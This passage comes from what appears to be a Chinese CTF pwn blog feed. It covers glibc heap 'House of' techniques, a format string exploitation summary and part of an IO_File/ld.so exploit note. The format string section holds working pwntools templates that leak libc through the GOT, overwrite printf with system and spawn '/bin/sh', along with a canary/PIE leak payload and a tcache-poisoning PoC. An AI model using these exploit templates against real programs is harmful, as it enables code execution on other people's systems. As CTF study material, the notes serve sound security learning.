chunk2 进入 largebin，触发 largebin attack</span></span><br><span class="line">                        <span class="comment">// target_addr 处被写入 chunk2 的地址</span></span><br></pre></td></tr></table></figure></p>
<h1 id="series-of-house">[8] Series of House</h1>
<h2 id="house-of-orange">[8-1] House of Orange</h2>
<h3 id="概述-6">[8-1-1] 概述</h3>
<p>HouseofOrange是在程序没有可以操控的free时，利用ptmalloc的管理机制强行制造出一个unsortedbin中的chunk的技术。</p>
<h3 id="伪造chunk需求">[8-1-2] 伪造chunk需求</h3>
<ol type="1">
<li><p>top_chunk的结束地址必须页对齐</p>
<ul>
<li>一般情况下，ptmalloc设置top_chunk为0x21000，我们申请一个0x10的chunk0后，chunk0加上chunk_head是0x20大小，此时top_chunk切割后还剩下0x20fe0大小，为了页对齐，我们伪造top_chunk的大小为0xfe0即可</li>
</ul></li>
<li><p>top_chunk.size &gt;= MINSIZE</p></li>
<li><p>top_chunk.size &lt; chunk_size + MINSIZE</p></li>
<li><p>top_chunk.prev_inuse == 1</p>
<ul>
<li>第一点中说的0xfe0要变为0xfe1</li>
</ul></li>
</ol>
<h2 id="house-of-force-hof">[8-2] House of Force (HOF)</h2>
<h3 id="概述-7">[8-2-1] 概述</h3>
<p>House of Force 是通过 topchunk 来实现任意地址写的操作。</p>
<p>具体来说，我们先修改 topchunk 的 size 域，接着用 malloc(c_size) 从
topchunk 切割一个 chunkF，在切割前，通过构造 malloc chunkF 时的
c_size，能改变 main_arena 中指向 topchunk
的指针为任意值，从而在切割时能在任意地址申请一个
chunk，进而实现任意地址写。</p>
<h3 id="具体原理">[8-2-2] 具体原理</h3>
<ul>
<li><p>从 topchunk 申请 chunk
的具体实现是这样的，其中的代码可以这样理解(我没读源码，只是从应用角度逆推原理):</p>
<ul>
<li><p>⚠注：本段代码的数据全为 unsigned，也就是说，我们要申请的 chunk 的
size 即 nb 会被转化为无符号，topchunk 的 size 也是无符号的</p></li>
<li><p>victim: 获取指向目标 chunk 的指针，在这是 topchunk</p></li>
<li><p>chunksize(victim): 获取 victim 指向的 chunk 的大小</p></li>
<li><p>nb: chunk 的实际大小，malloc(size) 时 nb = request2size(size)
<code>这个地方我也没搞清楚，主要有的时候nextchunk的prev_size域也被拿来当作chunk的一部分，就导致我不是很清楚对齐这一块怎么做的，后面仔细读一下源码再来订正</code></p></li>
<li><p>chunk_at_offset(victim, nb): return(victim + nb)</p></li>
</ul></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>House of Force 逻辑如下：</p>
</blockquote>
<p>首先通过堆溢出之类的手段，改变 topchunk 的 size 域为
-1，即0xffffffffffffffff</p>
<p>在 <code>chunkFakealloc(size)</code> 时，通过构造
size（由于<code>nb = request2size(size)</code>,所以构造 nb
的本质就是构造 size），切割程序会运行到如下代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">av-&gt;top        = remainder;</span><br></pre></td></tr></table></figure>
<p>此时，remainder 会被赋值为 victim + nb，而下一行代码
<code>av-&gt;top = remainder</code> 使得 main_arena 中指向 topchunk
的指针被修改</p>
<p>值得注意的是，若 nb 为负数，victim + nb 会溢出，从而将 victim
修改为比 victim 自己指向的地址更低的地址。</p>
<p>也就是说，通过构造 nb，我们可以将 av-&gt;top 改写为
<code>Any Address</code></p>
<p>而通过再一次的 <code>chunkNewalloc(nb)</code>，我们就可以在
<code>Any Address</code> 处申请一个 chunk，进而实现任意地址写.</p>
<p>总而言之，在改变 topchunk 的 size 域为 -1 之后，只要我们能够精心构造
<code>malloc(nb)</code> 时的 nb，就可以实现任意地址写。</p>
<p>那么接下来的问题很显然，如何构造 nb ，也就是如何构造 size？</p>
<blockquote>
<p>size 的构造</p>
</blockquote>
<p>malloc 的过程中会遇到如下检查，<code>req</code>就是我们申请的 chunk
的大小，就是前文提到的 request2size的参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// MINSIZE = 2 * SIZE_SZ</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br></pre></td></tr></table></figure>
<p>其中，<code>SIZE_SZ</code> 在 64 位是 0x08，32 位为 0x04，因此
<code>MINSIZE</code> 在 64 位中是 0x10，32 位为 0x08</p>
<p>由于 -2 * MINSIZE 被转化为了无符号数，拿 64 位举例，req 很难超过
0xfffffffffffffff0
这么大的数字，所以这个检测是很好绕过的，或者说根本不用 care
这个检测。</p>
<p>接下来，<code>req</code>会经过如下函数，转化为要申请的 chunk 的 真实
size，也就是 nb</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure>
<p>其中，<code>MALLOC_ALIGN_MASK</code> 在 64 位是 0xF 即 1111b，32位为
0x7 即 111b.</p>
<p><code>这里有点没想明白 request2size 的过程，我先假设在 malloc(size) 时，nb = request2size(req) = request2size(size)</code></p>
<p>由于 nb 都是对齐的，所以我们可以不用考虑
<code>&amp; ~MALLOC_ALIGN_MASK</code>，所以 size = req = nb - SIZE_SZ -
MALLOC_ALIGN_MASK</p>
<p>至此，我们构造出了 size，HOF结束.</p>
<h2 id="house-of-botcake">[8-3] House of botcake</h2>
<blockquote>
<p>libc: 2.29 -</p>
</blockquote>
<h3 id="概述-8">[8-3-1] 概述</h3>
<p>由于 libc 2.29 之后加入了 tcachebin 检查机制，所以 tcachebin double
free 变得没有那么好利用</p>
<p>但由于放入 unsortedbin 中的 chunk，再被 free 进 tcachebin
的时候检测相当薄弱</p>
<p>所以我们可以先把 chunk free 进 unsortedbin，再 free 进
tcachebin，当我们切割 unsortedbin 时就能修改 tcachebin 里重叠的 chunk 的
fd/bk，造成 tcachebin poisoning</p>
<h3 id="poc-1">[8-3-2] POC</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    malloc(<span class="number">0x80</span>) <span class="comment"># idx0-6: tcache | idx7,8:unsorted</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment"># idx9: 防止 unsortedbin 与 topchunk 合并</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i) <span class="comment"># idx0-6: tcache</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># chunk7 后向合并 chunk8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 tcachebin[0x80] 取出一个 chunk，此时 tcachebin 链只剩六个 chunk</span></span><br><span class="line">malloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把本在 unsortedbin 中的 chunk8 放入 tcachebin</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 chunk7,8 切割，但实际上已经覆盖了 tcachebin chunk8 的 fd/bk 指针了</span></span><br><span class="line">malloc(<span class="number">0xa0</span>) </span><br></pre></td></tr></table></figure>
<h3 id="一些疑问">[8-3-3] 一些疑问</h3>
<p>不构造 chunk 7，直接把 chunk8 放进 unsortedbin 再放进 tcachebin
中是完全可行的，但当我切割 chunk8 时就会报错
<code>malloc(): unsorted double linked list corrupted\n</code></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x55dd5ca32690</span> —▸ <span class="number">0x55dd5ca32570</span> —▸ <span class="number">0x55dd5ca324e0</span> —▸ <span class="number">0x55dd5ca32450</span> —▸ <span class="number">0x55dd5ca323c0</span> —▸ <span class="number">0x55dd5ca32330</span> —▸ <span class="number">0x55dd5ca322a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted] <span class="comment">// 或许跟这里有关系？</span></span><br><span class="line"><span class="attr">FD</span>: <span class="number">0x55dd5ca32680</span> —▸ <span class="number">0x55dd5ca32570</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="attr">BK</span>: <span class="number">0x55dd5ca32680</span> —▸ <span class="number">0x55dd5ca32010</span> ◂— <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>目前猜测是: 直接把 chunk8 放进 tcachebin 会导致原本存在 chunk8 fd/bk
处的 &amp;main_arena+88 被替换，导致 malloc 错误</p>
<h2 id="house-of-banana">[8-4] House of banana</h2>
<p>具体细节可以看这篇<a
href="https://www.secpulse.com/archives/180765.html">文章</a></p>
<h3 id="概述-9">[8-4-1] 概述</h3>
<p>当程序显式调用<code>exit()</code>函数时，程序会通过<code>exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ()</code>这条调用链调用
<code>array[i]()</code>。</p>
<p>而 <code>array[i]()</code> 是通过
<code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code>
定位的</p>
<p>通过 largebin
attack，我们可以篡改<code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code>指针，将其值修改为我们可以控制的堆地址，</p>
<p>而通过在堆上伪造一个 link_map 结构体，我们可以欺骗程序，使其执行
<code>array[i]()</code> 时执行在结构体里放入的提权函数，进而提权</p>
<h3 id="poc-2">[8-4-2] POC</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># largebin attack 修改 _rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 fake chunk</span></span><br></pre></td></tr></table></figure>
<h3 id="如何构造-fake_chunk">[8-4-3] 如何构造 fake_chunk?</h3>
<p>见 <a
href="https://heygap.github.io/2024/02/15/Pwn%20-%20IO_File%20and%20ld.so%20exploit%20summary/#more">Pwn
- IO_File and ld.so exploit summary</a></p>
<h2 id="house-of-pig">[8-5] House of pig</h2>
<p>https://bbs.kanxue.com/thread-268245.htm#msg_header_h3_2</p>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Format String Summary</title>
    <url>/2024/01/21/Pwn%20-%20Format%20String%20Summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
总结一下格式化字符串漏洞，便于后续调用
</blockquote>
<span id="more"></span>
<h1 id="原理-工具">原理 &amp; 工具</h1>
<h2 id="原理">原理</h2>
<blockquote>
<p>本质是利用 printf(string) 任意地址读写</p>
</blockquote>
<blockquote>
<p>记录一下常用的格式</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt    :        标准作用       ||           常用方式</span><br><span class="line">——————————————————————————————————————————————————————————————</span><br><span class="line">%p     :     输出栈上的内容     |  (读) 找偏移\pie_base\canary</span><br><span class="line">%s     :   输出地址指向的内容   ||     (读) 泄露libc_base</span><br><span class="line">%hhn   :   修改地址指向的byte   |        (写) 任意地址写</span><br><span class="line">%hn/%n : 修改地址指向的2/4bytes |        (写) 任意地址写</span><br></pre></td></tr></table></figure>
<h2 id="工具-pwntools---fmtstr_payload">工具: Pwntools -
fmtstr_payload</h2>
<p><a href="https://docs.pwntools.com/en/stable/fmtstr.html">Pwntools -
class fmtstr</a></p>
<blockquote>
<p>源码见上述链接或文章末尾的 Appendix</p>
</blockquote>
<p>fmtstr是一个类，我们只需要用其中的 fmtstr_payload 来构造我们的
payload 即可。现在版本的 pwntools 已经支持 64 位的 格式化字符串 payload
生成了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Default: numbwritten=0 , write_size=<span class="string">&#x27;byte&#x27;</span></span></span><br><span class="line">payload = fmtstr_payload(offset, writes, numbwritten=, write_size=&#x27;&#x27;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Example:</span></span><br><span class="line">context.clear(arch = &#x27;amd64&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">context.clear(arch = &#x27;i386&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%5$na\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x00000001&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;c%3$naaa\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: b&quot;\xff\xff\x04\x11\x00\x00\x00\x00&quot;&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(10, &#123;0x404048 : 0xbadc0ffe, 0x40403c : 0xdeadbeef&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%125c%hhn%17c%hhn%32c%hhn%17c%hhn%203c%hhn%34c%hhn%3618c%hnacccc&gt;@@\x00cccc=@@\x00cccc?@@\x00cccc&lt;@@\x00ccccK@@\x00ccccJ@@\x00ccccH@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x404048 : 0xbadbad00&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%229c%hhn%173c%hhn%13c%hhn%33c%hhnccccH@@\x00ccccI@@\x00ccccK@@\x00ccccJ@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x4040 : 0xbadbad00, 0x4060: 0xbadbad02&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%212c%hhn%173c%hhn%13c%hhn%33c%hhn%39c%hhn%171c%hhn%13c%hhn%33c%hhnacccc@@\x00\x00ccccA@\x00\x00ccccC@\x00\x00ccccB@\x00\x00cccc`@\x00\x00cccca@\x00\x00ccccc@\x00\x00ccccb@\x00\x00&#x27;</span><br></pre></td></tr></table></figure>
<h1 id="ctf-中的题型">CTF 中的题型</h1>
<h2 id="栈上">栈上</h2>
<h3 id="位">32位</h3>
<blockquote>
<p>最基础的题目，fmtstr_payload一把梭，模板如下</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 确认偏移量</span></span><br><span class="line">payload = <span class="string">&#x27;%p-&#x27;</span>*<span class="number">10</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 offset=6，泄露libc基址</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload    = p32(printf_got) + <span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line"><span class="comment"># payload  = b&#x27;%7$s&#x27; + p32(printf_got)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认libc</span></span><br><span class="line">printf_addr = u32(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">3</span>:])</span><br><span class="line">libc        = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收程序信息，向程序发送payload</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;,numbwritten=<span class="number">0</span>,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">io.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="位-1">64位</h3>
<blockquote>
<p>由于许多地址只有六字节，所以为了对齐八字节，我们需要用''来填充，但''会截断
printf 的输出，所以我们需要让 printf 先输出格式化字符.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认偏移量</span></span><br><span class="line">payload = <span class="string">&#x27;%p-&#x27;</span>*<span class="number">10</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 offset=6，泄露libc基址</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload  = <span class="string">b&#x27;%7$sAAAA&#x27;</span> + p64(printf_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认libc</span></span><br><span class="line">printf_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc        = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收程序信息，向程序发送payload</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;,numbwritten=<span class="number">0</span>,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">io.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="非栈上bss段">非栈上(BSS段)</h2>
<p>2023moeCTF的第三道fmt就是这种题目，exp在本地，后续有时间更新</p>
<h2 id="特殊情况">特殊情况</h2>
<h3 id="一次printf就返回">一次printf就返回</h3>
<blockquote>
<p>printf 的要求十分严格，通常有两种做法</p>
</blockquote>
<ol type="1">
<li>要求：栈上有一串具有三个函数的rbp的链，NO PIE，libc已知
<ol type="1">
<li>做法：在栈上布满one_gadget，然后找到一条带有3个rbp的链，修改中间一个
node 的低字节，让其指向的rbp变低，进而在返回时可以直接返回og</li>
<li>本质: 利用 ret(实质是 pop rip) 时返回栈帧上的一条指令</li>
</ol></li>
<li><a
href="https://www.freebuf.com/articles/system/385029.html">打fini_array（未学习）</a></li>
</ol>
<h3 id="full-relro">FULL RELRO</h3>
<blockquote>
<p>FULL RELRO 意味着我们不能修改 got 表，所以我们需要修改返回地址</p>
</blockquote>
<p>要求：可以 printf
的次数较多(至少多于四次)，可以让我们将返回地址修改为 one_gadget</p>
<h3 id="piecanary-bypass">PIE/Canary bypass</h3>
<blockquote>
<p>假设调用链为 main-&gt;func-&gt;printf，而在 func 中存放着 fmt，则栈中
fmt
上方不远处一定有调用printf语句的下一句(PC+4)，即返回地址，和canary</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">假设偏移量为6，栈构造如下</span><br><span class="line">---printf栈帧---</span><br><span class="line">................</span><br><span class="line"> printf_canary    &lt;- offset = 3</span><br><span class="line">   printf_rbp     &lt;- offset = 4</span><br><span class="line">printf_ret_addr   &lt;- offset = 5</span><br><span class="line">---printf栈帧---</span><br><span class="line"></span><br><span class="line">----func栈帧----</span><br><span class="line">      fmt         &lt;- offset = 6</span><br><span class="line">----func栈帧----</span><br><span class="line"></span><br><span class="line">----main栈帧----</span><br><span class="line">...............</span><br><span class="line">----main栈帧----</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">泄露 pie_base &amp; canary</span></span><br><span class="line">payload = &#x27;%3$p-%5$p-END&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">func_addr,canary = [int(x,16) for x in io.recvuntil(&#x27;END&#x27;)[-35:-4].split(b&#x27;-&#x27;)]</span><br><span class="line">ret_offset = </span><br><span class="line">pie_base   = func_addr - ret_offset</span><br></pre></td></tr></table></figure>
<h1 id="appendix">Appendix</h1>
<h2
id="pwnlib.fmtstr.fmtstr_payload源码">pwnlib.fmtstr.fmtstr_payload源码</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr_payload</span> (</span><br><span class="line">        offset,              <span class="comment"># 字符串在栈上的偏移量</span></span><br><span class="line">        writes,              <span class="comment"># &#123;target_addr:int_to_write&#125; 要写入的数字</span></span><br><span class="line">        numbwritten=<span class="number">0</span>,       <span class="comment"># printf 已经打印的字符数量</span></span><br><span class="line">        write_size=<span class="string">&#x27;byte&#x27;</span>,   <span class="comment"># 写入字节的大小</span></span><br><span class="line">        write_size_max=<span class="string">&#x27;long&#x27;</span>, <span class="comment"># </span></span><br><span class="line">        overflows=<span class="number">16</span>,        <span class="comment"># </span></span><br><span class="line">        strategy=<span class="string">&quot;small&quot;</span>,    <span class="comment"># 默认small，如果追求速度可以用fast模式</span></span><br><span class="line">        badbytes=<span class="built_in">frozenset</span>(),  <span class="comment"># </span></span><br><span class="line">        offset_bytes=<span class="number">0</span>,      <span class="comment"># </span></span><br><span class="line">        no_dollars=<span class="literal">False</span>     <span class="comment"># 是否有 $ 符号,比如不用 &#x27;%996$n&#x27;</span></span><br><span class="line">    ):</span><br><span class="line"></span><br><span class="line">    sz = WRITE_SIZE[write_size]</span><br><span class="line">    szmax = WRITE_SIZE[write_size_max]</span><br><span class="line">    all_atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)</span><br><span class="line"></span><br><span class="line">    fmt = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        data_offset = (offset_bytes + <span class="built_in">len</span>(fmt)) // context.<span class="built_in">bytes</span></span><br><span class="line">        fmt, data = make_payload_dollar(offset + data_offset, all_atoms, numbwritten=numbwritten, no_dollars=no_dollars)</span><br><span class="line">        fmt = fmt + cyclic((-<span class="built_in">len</span>(fmt)-offset_bytes) % context.<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(fmt) + offset_bytes == data_offset * context.<span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;this is a bug ... format string building did not converge&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fmt + data</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - IO_File and ld.so exploit summary</title>
    <url>/2024/02/15/Pwn%20-%20IO_File%20and%20ld.so%20exploit%20summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
IO_File 与 ld.so 利用总结
</blockquote>
<span id="more"></span>
<h1 id="io_file">[1] IO_File</h1>
<p><a href="https://www.cnblogs.com/hawkJW/p/13546416.html">好文</a></p>
<p><a
href="https://mp.weixin.qq.com/s/OjMQjjI2ESfmZ5wwFbNhRQ">PIG-007</a></p>
<p><a href="https://bbs.kanxue.com/thread-276044.htm">glibc2.37
IO</a></p>
<h1 id="ld.so">[2] ld.so</h1>
<h2 id="rtld_global._dl_ns._ns_loaded">[2-1]
_rtld_global._dl_ns._ns_loaded</h2>
<h3 id="原理">[2-1-1] 原理</h3>
<p>程序在调用<code>exit()</code>退出时，会调用<code>(待调试)</code>，而我们可以通过修改
<code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code></p>
<h3 id="找偏移量">[2-1-2] 找偏移量</h3>
<blockquote>
<p>恢复调试符号请看<a
href="https://heygap.github.io/2023/09/22/Pwn%20-%20Heap%20Exploit%20Summary/#more">Pwn
- Heap Exploit Summary</a> 的 patchelf 部分</p>
</blockquote>
<p>恢复调试符号以后，在 pwndbg 中输入 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找 &amp;(_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next) </span></span><br><span class="line"><span class="comment"># 与 &amp;(_rtld_global) 之间的偏移量</span></span><br><span class="line">pwndbg&gt; distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line">0x7f992b424040-&gt;0x7f992b3f3018 is -0x31028 bytes (-0x6205 words)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找 _rtld_global 的真实地址</span></span><br><span class="line">pwndbg&gt; p &amp;_rtld_global</span><br><span class="line"><span class="variable">$1</span> = (struct rtld_global *) 0x7f8bb8255040 &lt;_rtld_global&gt;</span><br><span class="line"><span class="comment"># 若本次运行的 libc_base 为 0x7f8bb803a000</span></span><br><span class="line"><span class="comment"># 则 offset = 0x7f8bb8255040 - 0x7f8bb803a000 = 0x21b040</span></span><br><span class="line"><span class="comment"># 这个 offset 会在下面的 python 代码中用到</span></span><br></pre></td></tr></table></figure></p>
